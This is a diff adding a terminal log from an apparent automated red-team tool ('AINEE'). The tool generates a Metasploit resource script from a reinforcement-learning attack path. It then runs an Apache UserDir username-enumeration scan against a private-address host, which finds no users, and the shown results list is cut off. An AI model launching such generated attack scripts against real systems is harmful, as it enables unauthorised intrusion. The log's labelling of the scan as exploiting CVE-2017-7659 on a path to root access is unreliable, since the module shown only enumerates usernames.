@@ -1,0 +1,573 @@
+                                                                     
+┌──(kali㉿kali)-[~/redteamer]
+└─$ python3 phase5_exploit.py                                  
+============================================================
+AINEE Phase 5 — Automated Exploitation
+============================================================
+Optimal path: attacker -> apache_2.4.25 -> CVE-2017-7659 -> webserver_access -> root_access
+Total reward: 104.425
+
+Metasploit RC script saved to ainee_exploit.rc
+
+Generated RC script:
+----------------------------------------
+# AINEE Auto-generated Metasploit script
+# Generated from Phase 4 DQN optimal path
+
+# Exploiting CVE-2017-7659
+use auxiliary/scanner/http/apache_userdir_enum
+set RHOSTS 10.60.8.35
+set RPORT 8080
+run
+sleep 2
+
+exit
+----------------------------------------
+
+Run exploit? (yes/no): yes
+
+Running Metasploit with ainee_exploit.rc...
+============================================================
+[*] Processing ainee_exploit.rc for ERB directives.
+resource (ainee_exploit.rc)> use auxiliary/scanner/http/apache_userdir_enum
+resource (ainee_exploit.rc)> set RHOSTS 10.60.8.35
+RHOSTS => 10.60.8.35
+resource (ainee_exploit.rc)> set RPORT 8080
+RPORT => 8080
+resource (ainee_exploit.rc)> run
+[*] http://10.60.8.35:8080/~ - Trying UserDir: ''
+[*] http://10.60.8.35:8080/ - Apache UserDir: '' not found
+[*] http://10.60.8.35:8080/~4Dgifts - Trying UserDir: '4Dgifts'
+[*] http://10.60.8.35:8080/ - Apache UserDir: '4Dgifts' not found
+[*] http://10.60.8.35:8080/~abrt - Trying UserDir: 'abrt'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'abrt' not found
+[*] http://10.60.8.35:8080/~adm - Trying UserDir: 'adm'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'adm' not found
+[*] http://10.60.8.35:8080/~admin - Trying UserDir: 'admin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'admin' not found
+[*] http://10.60.8.35:8080/~administrator - Trying UserDir: 'administrator'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'administrator' not found
+[*] http://10.60.8.35:8080/~anon - Trying UserDir: 'anon'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'anon' not found
+[*] http://10.60.8.35:8080/~_apt - Trying UserDir: '_apt'
+[*] http://10.60.8.35:8080/ - Apache UserDir: '_apt' not found
+[*] http://10.60.8.35:8080/~arpwatch - Trying UserDir: 'arpwatch'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'arpwatch' not found
+[*] http://10.60.8.35:8080/~auditor - Trying UserDir: 'auditor'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'auditor' not found
+[*] http://10.60.8.35:8080/~avahi - Trying UserDir: 'avahi'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'avahi' not found
+[*] http://10.60.8.35:8080/~avahi-autoipd - Trying UserDir: 'avahi-autoipd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'avahi-autoipd' not found
+[*] http://10.60.8.35:8080/~backup - Trying UserDir: 'backup'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'backup' not found
+[*] http://10.60.8.35:8080/~bbs - Trying UserDir: 'bbs'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'bbs' not found
+[*] http://10.60.8.35:8080/~beef-xss - Trying UserDir: 'beef-xss'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'beef-xss' not found
+[*] http://10.60.8.35:8080/~bin - Trying UserDir: 'bin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'bin' not found
+[*] http://10.60.8.35:8080/~bitnami - Trying UserDir: 'bitnami'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'bitnami' not found
+[*] http://10.60.8.35:8080/~checkfs - Trying UserDir: 'checkfs'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'checkfs' not found
+[*] http://10.60.8.35:8080/~checkfsys - Trying UserDir: 'checkfsys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'checkfsys' not found
+[*] http://10.60.8.35:8080/~checksys - Trying UserDir: 'checksys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'checksys' not found
+[*] http://10.60.8.35:8080/~chronos - Trying UserDir: 'chronos'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'chronos' not found
+[*] http://10.60.8.35:8080/~chrony - Trying UserDir: 'chrony'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'chrony' not found
+[*] http://10.60.8.35:8080/~cmwlogin - Trying UserDir: 'cmwlogin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'cmwlogin' not found
+[*] http://10.60.8.35:8080/~cockpit-ws - Trying UserDir: 'cockpit-ws'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'cockpit-ws' not found
+[*] http://10.60.8.35:8080/~colord - Trying UserDir: 'colord'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'colord' not found
+[*] http://10.60.8.35:8080/~couchdb - Trying UserDir: 'couchdb'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'couchdb' not found
+[*] http://10.60.8.35:8080/~cups-pk-helper - Trying UserDir: 'cups-pk-helper'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'cups-pk-helper' not found
+[*] http://10.60.8.35:8080/~daemon - Trying UserDir: 'daemon'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'daemon' not found
+[*] http://10.60.8.35:8080/~dbadmin - Trying UserDir: 'dbadmin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dbadmin' not found
+[*] http://10.60.8.35:8080/~dbus - Trying UserDir: 'dbus'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dbus' not found
+[*] http://10.60.8.35:8080/~debian - Trying UserDir: 'debian'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'debian' not found
+[*] http://10.60.8.35:8080/~Debian-exim - Trying UserDir: 'Debian-exim'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'Debian-exim' not found
+[*] http://10.60.8.35:8080/~Debian-snmp - Trying UserDir: 'Debian-snmp'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'Debian-snmp' not found
+[*] http://10.60.8.35:8080/~demo - Trying UserDir: 'demo'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'demo' not found
+[*] http://10.60.8.35:8080/~demos - Trying UserDir: 'demos'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'demos' not found
+[*] http://10.60.8.35:8080/~diag - Trying UserDir: 'diag'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'diag' not found
+[*] http://10.60.8.35:8080/~distccd - Trying UserDir: 'distccd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'distccd' not found
+[*] http://10.60.8.35:8080/~dni - Trying UserDir: 'dni'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dni' not found
+[*] http://10.60.8.35:8080/~dnsmasq - Trying UserDir: 'dnsmasq'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dnsmasq' not found
+[*] http://10.60.8.35:8080/~dradis - Trying UserDir: 'dradis'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dradis' not found
+[*] http://10.60.8.35:8080/~EZsetup - Trying UserDir: 'EZsetup'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'EZsetup' not found
+[*] http://10.60.8.35:8080/~fal - Trying UserDir: 'fal'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'fal' not found
+[*] http://10.60.8.35:8080/~fax - Trying UserDir: 'fax'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'fax' not found
+[*] http://10.60.8.35:8080/~ftp - Trying UserDir: 'ftp'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ftp' not found
+[*] http://10.60.8.35:8080/~games - Trying UserDir: 'games'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'games' not found
+[*] http://10.60.8.35:8080/~gdm - Trying UserDir: 'gdm'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gdm' not found
+[*] http://10.60.8.35:8080/~geoclue - Trying UserDir: 'geoclue'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'geoclue' not found
+[*] http://10.60.8.35:8080/~gnats - Trying UserDir: 'gnats'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gnats' not found
+[*] http://10.60.8.35:8080/~gnome-initial-setup - Trying UserDir: 'gnome-initial-setup'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gnome-initial-setup' not found
+[*] http://10.60.8.35:8080/~gopher - Trying UserDir: 'gopher'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gopher' not found
+[*] http://10.60.8.35:8080/~gropher - Trying UserDir: 'gropher'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gropher' not found
+[*] http://10.60.8.35:8080/~guest - Trying UserDir: 'guest'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'guest' not found
+[*] http://10.60.8.35:8080/~haldaemon - Trying UserDir: 'haldaemon'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'haldaemon' not found
+[*] http://10.60.8.35:8080/~halt - Trying UserDir: 'halt'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'halt' not found
+[*] http://10.60.8.35:8080/~hplip - Trying UserDir: 'hplip'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'hplip' not found
+[*] http://10.60.8.35:8080/~inetsim - Trying UserDir: 'inetsim'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'inetsim' not found
+[*] http://10.60.8.35:8080/~informix - Trying UserDir: 'informix'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'informix' not found
+[*] http://10.60.8.35:8080/~install - Trying UserDir: 'install'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'install' not found
+[*] http://10.60.8.35:8080/~iodine - Trying UserDir: 'iodine'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'iodine' not found
+[*] http://10.60.8.35:8080/~irc - Trying UserDir: 'irc'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'irc' not found
+[*] http://10.60.8.35:8080/~jet - Trying UserDir: 'jet'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'jet' not found
+[*] http://10.60.8.35:8080/~karaf - Trying UserDir: 'karaf'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'karaf' not found
+[*] http://10.60.8.35:8080/~kernoops - Trying UserDir: 'kernoops'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'kernoops' not found
+[*] http://10.60.8.35:8080/~king-phisher - Trying UserDir: 'king-phisher'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'king-phisher' not found
+[*] http://10.60.8.35:8080/~landscape - Trying UserDir: 'landscape'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'landscape' not found
+[*] http://10.60.8.35:8080/~libstoragemgmt - Trying UserDir: 'libstoragemgmt'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'libstoragemgmt' not found
+[*] http://10.60.8.35:8080/~libuuid - Trying UserDir: 'libuuid'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'libuuid' not found
+[*] http://10.60.8.35:8080/~lightdm - Trying UserDir: 'lightdm'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lightdm' not found
+[*] http://10.60.8.35:8080/~linaro - Trying UserDir: 'linaro'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'linaro' not found
+[*] http://10.60.8.35:8080/~list - Trying UserDir: 'list'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'list' not found
+[*] http://10.60.8.35:8080/~listen - Trying UserDir: 'listen'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'listen' not found
+[*] http://10.60.8.35:8080/~lp - Trying UserDir: 'lp'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lp' not found
+[*] http://10.60.8.35:8080/~lpadm - Trying UserDir: 'lpadm'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lpadm' not found
+[*] http://10.60.8.35:8080/~lpadmin - Trying UserDir: 'lpadmin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lpadmin' not found
+[*] http://10.60.8.35:8080/~lxd - Trying UserDir: 'lxd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lxd' not found
+[*] http://10.60.8.35:8080/~lynx - Trying UserDir: 'lynx'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lynx' not found
+[*] http://10.60.8.35:8080/~mail - Trying UserDir: 'mail'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mail' not found
+[*] http://10.60.8.35:8080/~man - Trying UserDir: 'man'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'man' not found
+[*] http://10.60.8.35:8080/~me - Trying UserDir: 'me'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'me' not found
+[*] http://10.60.8.35:8080/~messagebus - Trying UserDir: 'messagebus'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'messagebus' not found
+[*] http://10.60.8.35:8080/~miredo - Trying UserDir: 'miredo'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'miredo' not found
+[*] http://10.60.8.35:8080/~mountfs - Trying UserDir: 'mountfs'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mountfs' not found
+[*] http://10.60.8.35:8080/~mountfsys - Trying UserDir: 'mountfsys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mountfsys' not found
+[*] http://10.60.8.35:8080/~mountsys - Trying UserDir: 'mountsys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mountsys' not found
+[*] http://10.60.8.35:8080/~mysql - Trying UserDir: 'mysql'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mysql' not found
+[*] http://10.60.8.35:8080/~news - Trying UserDir: 'news'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'news' not found
+[*] http://10.60.8.35:8080/~noaccess - Trying UserDir: 'noaccess'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'noaccess' not found
+[*] http://10.60.8.35:8080/~nobody - Trying UserDir: 'nobody'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nobody' not found
+[*] http://10.60.8.35:8080/~nobody4 - Trying UserDir: 'nobody4'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nobody4' not found
+[*] http://10.60.8.35:8080/~ntp - Trying UserDir: 'ntp'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ntp' not found
+[*] http://10.60.8.35:8080/~nuucp - Trying UserDir: 'nuucp'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nuucp' not found
+[*] http://10.60.8.35:8080/~nxautomation - Trying UserDir: 'nxautomation'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nxautomation' not found
+[*] http://10.60.8.35:8080/~nxpgsql - Trying UserDir: 'nxpgsql'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nxpgsql' not found
+[*] http://10.60.8.35:8080/~omi - Trying UserDir: 'omi'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'omi' not found
+[*] http://10.60.8.35:8080/~omsagent - Trying UserDir: 'omsagent'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'omsagent' not found
+[*] http://10.60.8.35:8080/~operator - Trying UserDir: 'operator'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'operator' not found
+[*] http://10.60.8.35:8080/~oracle - Trying UserDir: 'oracle'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'oracle' not found
+[*] http://10.60.8.35:8080/~OutOfBox - Trying UserDir: 'OutOfBox'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'OutOfBox' not found
+[*] http://10.60.8.35:8080/~pi - Trying UserDir: 'pi'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pi' not found
+[*] http://10.60.8.35:8080/~pico - Trying UserDir: 'pico'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pico' not found
+[*] http://10.60.8.35:8080/~polkitd - Trying UserDir: 'polkitd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'polkitd' not found
+[*] http://10.60.8.35:8080/~pollinate - Trying UserDir: 'pollinate'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pollinate' not found
+[*] http://10.60.8.35:8080/~popr - Trying UserDir: 'popr'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'popr' not found
+[*] http://10.60.8.35:8080/~postfix - Trying UserDir: 'postfix'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'postfix' not found
+[*] http://10.60.8.35:8080/~postgres - Trying UserDir: 'postgres'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'postgres' not found
+[*] http://10.60.8.35:8080/~postmaster - Trying UserDir: 'postmaster'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'postmaster' not found
+[*] http://10.60.8.35:8080/~printer - Trying UserDir: 'printer'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'printer' not found
+[*] http://10.60.8.35:8080/~proxy - Trying UserDir: 'proxy'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'proxy' not found
+[*] http://10.60.8.35:8080/~pulse - Trying UserDir: 'pulse'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pulse' not found
+[*] http://10.60.8.35:8080/~radxa - Trying UserDir: 'radxa'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'radxa' not found
+[*] http://10.60.8.35:8080/~redsocks - Trying UserDir: 'redsocks'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'redsocks' not found
+[*] http://10.60.8.35:8080/~rfindd - Trying UserDir: 'rfindd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rfindd' not found
+[*] http://10.60.8.35:8080/~riscv - Trying UserDir: 'riscv'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'riscv' not found
+[*] http://10.60.8.35:8080/~rje - Trying UserDir: 'rje'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rje' not found
+[*] http://10.60.8.35:8080/~rock - Trying UserDir: 'rock'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rock' not found
+[*] http://10.60.8.35:8080/~root - Trying UserDir: 'root'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'root' not found
+[*] http://10.60.8.35:8080/~ROOT - Trying UserDir: 'ROOT'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ROOT' not found
+[*] http://10.60.8.35:8080/~rooty - Trying UserDir: 'rooty'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rooty' not found
+[*] http://10.60.8.35:8080/~rpc - Trying UserDir: 'rpc'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rpc' not found
+[*] http://10.60.8.35:8080/~rpcuser - Trying UserDir: 'rpcuser'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rpcuser' not found
+[*] http://10.60.8.35:8080/~rtkit - Trying UserDir: 'rtkit'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rtkit' not found
+[*] http://10.60.8.35:8080/~rwhod - Trying UserDir: 'rwhod'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rwhod' not found
+[*] http://10.60.8.35:8080/~saned - Trying UserDir: 'saned'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'saned' not found
+[*] http://10.60.8.35:8080/~service - Trying UserDir: 'service'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'service' not found
+[*] http://10.60.8.35:8080/~setroubleshoot - Trying UserDir: 'setroubleshoot'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'setroubleshoot' not found
+[*] http://10.60.8.35:8080/~setup - Trying UserDir: 'setup'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'setup' not found
+[*] http://10.60.8.35:8080/~sgiweb - Trying UserDir: 'sgiweb'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sgiweb' not found
+[*] http://10.60.8.35:8080/~shutdown - Trying UserDir: 'shutdown'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'shutdown' not found
+[*] http://10.60.8.35:8080/~sigver - Trying UserDir: 'sigver'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sigver' not found
+[*] http://10.60.8.35:8080/~speech-dispatcher - Trying UserDir: 'speech-dispatcher'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'speech-dispatcher' not found
+[*] http://10.60.8.35:8080/~sshd - Trying UserDir: 'sshd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sshd' not found
+[*] http://10.60.8.35:8080/~sslh - Trying UserDir: 'sslh'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sslh' not found
+[*] http://10.60.8.35:8080/~sssd - Trying UserDir: 'sssd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sssd' not found
+[*] http://10.60.8.35:8080/~stunnel4 - Trying UserDir: 'stunnel4'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'stunnel4' not found
+[*] http://10.60.8.35:8080/~sym - Trying UserDir: 'sym'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sym' not found
+[*] http://10.60.8.35:8080/~symop - Trying UserDir: 'symop'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'symop' not found
+[*] http://10.60.8.35:8080/~sync - Trying UserDir: 'sync'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sync' not found
+[*] http://10.60.8.35:8080/~sys - Trying UserDir: 'sys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sys' not found
+[*] http://10.60.8.35:8080/~sysadm - Trying UserDir: 'sysadm'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sysadm' not found
+[*] http://10.60.8.35:8080/~sysadmin - Trying UserDir: 'sysadmin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sysadmin' not found
+[*] http://10.60.8.35:8080/~sysbin - Trying UserDir: 'sysbin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sysbin' not found
+[*] http://10.60.8.35:8080/~syslog - Trying UserDir: 'syslog'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'syslog' not found
+[*] http://10.60.8.35:8080/~system_admin - Trying UserDir: 'system_admin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'system_admin' not found
+[*] http://10.60.8.35:8080/~systemd-bus-proxy - Trying UserDir: 'systemd-bus-proxy'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-bus-proxy' not found
+[*] http://10.60.8.35:8080/~systemd-coredump - Trying UserDir: 'systemd-coredump'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-coredump' not found
+[*] http://10.60.8.35:8080/~systemd-network - Trying UserDir: 'systemd-network'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-network' not found
+[*] http://10.60.8.35:8080/~systemd-resolve - Trying UserDir: 'systemd-resolve'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-resolve' not found
+[*] http://10.60.8.35:8080/~systemd-timesync - Trying UserDir: 'systemd-timesync'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-timesync' not found
+[*] http://10.60.8.35:8080/~tcpdump - Trying UserDir: 'tcpdump'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'tcpdump' not found
+[*] http://10.60.8.35:8080/~trouble - Trying UserDir: 'trouble'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'trouble' not found
+[*] http://10.60.8.35:8080/~tss - Trying UserDir: 'tss'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'tss' not found
+[*] http://10.60.8.35:8080/~ubuntu - Trying UserDir: 'ubuntu'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ubuntu' not found
+[*] http://10.60.8.35:8080/~udadmin - Trying UserDir: 'udadmin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'udadmin' not found
+[*] http://10.60.8.35:8080/~ultra - Trying UserDir: 'ultra'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ultra' not found
+[*] http://10.60.8.35:8080/~umountfs - Trying UserDir: 'umountfs'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'umountfs' not found
+[*] http://10.60.8.35:8080/~umountfsys - Trying UserDir: 'umountfsys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'umountfsys' not found
+[*] http://10.60.8.35:8080/~umountsys - Trying UserDir: 'umountsys'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'umountsys' not found
+[*] http://10.60.8.35:8080/~unix - Trying UserDir: 'unix'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'unix' not found
+[*] http://10.60.8.35:8080/~unscd - Trying UserDir: 'unscd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'unscd' not found
+[*] http://10.60.8.35:8080/~us_admin - Trying UserDir: 'us_admin'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'us_admin' not found
+[*] http://10.60.8.35:8080/~usbmux - Trying UserDir: 'usbmux'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'usbmux' not found
+[*] http://10.60.8.35:8080/~user - Trying UserDir: 'user'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'user' not found
+[*] http://10.60.8.35:8080/~uucp - Trying UserDir: 'uucp'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'uucp' not found
+[*] http://10.60.8.35:8080/~uucpadm - Trying UserDir: 'uucpadm'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'uucpadm' not found
+[*] http://10.60.8.35:8080/~uuidd - Trying UserDir: 'uuidd'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'uuidd' not found
+[*] http://10.60.8.35:8080/~vagrant - Trying UserDir: 'vagrant'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'vagrant' not found
+[*] http://10.60.8.35:8080/~varnish - Trying UserDir: 'varnish'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'varnish' not found
+[*] http://10.60.8.35:8080/~web - Trying UserDir: 'web'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'web' not found
+[*] http://10.60.8.35:8080/~webmaster - Trying UserDir: 'webmaster'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'webmaster' not found
+[*] http://10.60.8.35:8080/~whoopsie - Trying UserDir: 'whoopsie'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'whoopsie' not found
+[*] http://10.60.8.35:8080/~www - Trying UserDir: 'www'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'www' not found
+[*] http://10.60.8.35:8080/~www-data - Trying UserDir: 'www-data'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'www-data' not found
+[*] http://10.60.8.35:8080/~xpdb - Trying UserDir: 'xpdb'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'xpdb' not found
+[*] http://10.60.8.35:8080/~xpopr - Trying UserDir: 'xpopr'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'xpopr' not found
+[*] http://10.60.8.35:8080/~zabbix - Trying UserDir: 'zabbix'
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'zabbix' not found
+[*] http://10.60.8.35:8080/ - No users found.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (ainee_exploit.rc)> sleep 2
+resource (ainee_exploit.rc)> exit
+
+
+============================================================
+EXPLOITATION RESULTS
+============================================================
+[*] http://10.60.8.35:8080/ - Apache UserDir: '' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: '4Dgifts' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'abrt' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'adm' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'admin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'administrator' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'anon' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: '_apt' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'arpwatch' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'auditor' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'avahi' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'avahi-autoipd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'backup' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'bbs' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'beef-xss' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'bin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'bitnami' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'checkfs' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'checkfsys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'checksys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'chronos' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'chrony' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'cmwlogin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'cockpit-ws' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'colord' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'couchdb' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'cups-pk-helper' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'daemon' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dbadmin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dbus' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'debian' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'Debian-exim' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'Debian-snmp' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'demo' not found
